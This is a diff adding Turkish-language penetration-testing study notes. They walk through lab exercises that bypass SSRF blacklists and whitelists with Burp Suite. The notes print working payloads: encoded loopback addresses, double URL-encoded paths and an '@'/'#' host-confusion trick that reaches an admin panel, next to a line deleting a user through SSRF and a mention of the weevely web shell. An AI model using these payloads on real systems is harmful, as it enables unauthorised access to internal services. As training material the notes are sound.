@@ -1585,10 +1585,51 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 
 - ```stockApi=http://192.168.0.157:8080/admin/delete?username=carlos``` diyerek carlos kullanıcısını silebiliriz
 
-
-
-
-
 > ## SSRF Blacklist
+
+- Blacklist'e alınan şeyler site içerisinde çalıştırılmaz
+- Bu örnekte "localhost", "127.0.0.1" vb şeyler blackliste alınmıştır ve açılmaz
+- Siteye giriyoruz
+- ```Burpsuite intercept is on``` yapıyoruz
+- Stockcheck yapıyoruz ve yakalıyoruz
+- ```stockApi=http://localhost/admin``` yazıp forward'lıyoruz ve "localhost" blacklist'e alındığı için hata alıyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.06.59.jpeg)
+
+- Sonuçları daha çabuk görmek için ```send to repeater``` diyoruz
+- ```stockApi=http://127.0.0.1/admin``` yazıp deniyoruz
+- ```stockApi=http://127.1/admin``` deniyoruz
+- URL içindeki birşeyleri değiştirmeyi deniyoruz
+- ```Decoder```'e giriyoruz ve ```admin```'i URL'ye çevirmeyi deniyoruz 
+- ```admin -> %61%64%6d%69%6e``` olarak çevirip ```stockApi=http://127.1/%61%64%6d%69%6e``` olarak deniyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.11.13.jpeg)
+
+-  ```admin```'i 2 kere URL'ye çevirmeyi deniyoruz 
+-  ```admin -> %61%64%6d%69%6e -> %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65```'e çeviriyoruz 
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.14.41.jpeg)
+
+-  ```stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65``` olarak deniyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.18.34.jpeg)
+
+- ```!! "admin"'in hepsini değil 1 harfini 2 kere URL encode ederek yazıp deneyebiliriz (stockApi=http://127.1/%25%36%31dmin)```
+
 > ## SSRF Whitelist
 
+- Whitelist'te sadece izin verilen bazı şeyler kabul ediliyor
+- Çözmesi blacklist'e göre daha zordur
+- Siteye giriyoruz
+- ```Burpsuite intercept is on``` diyoruz
+- Stock check yapıp yakalıyoruz
+- Yakaladıktan sonra ```sent to repeater``` diyoruz
+- ```stockApi=http://localhost/admin``` deniyoruz 
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.23.35.jpeg)
+
+- isteğin "stock.weliketoshop.net"'den gelmesi gerekiyor hatası alıyoruz
+- ```stockApi=http://stock.weliktetoshop.net/admin``` olarak deniyoruz ve farklı bir hata alıyoruz
+- ```stockApi=http://localhost:80#@stock.weliktetoshop.net/admin``` deniyoruz 
+- "#"'i 2 kere URL encode yapıp deniyoruz
+- ```stockApi=http://localhost:80%25%32%33@stock.weliktetoshop.net/admin``` deniyoruz ve admin paneline ulaşıyoruz
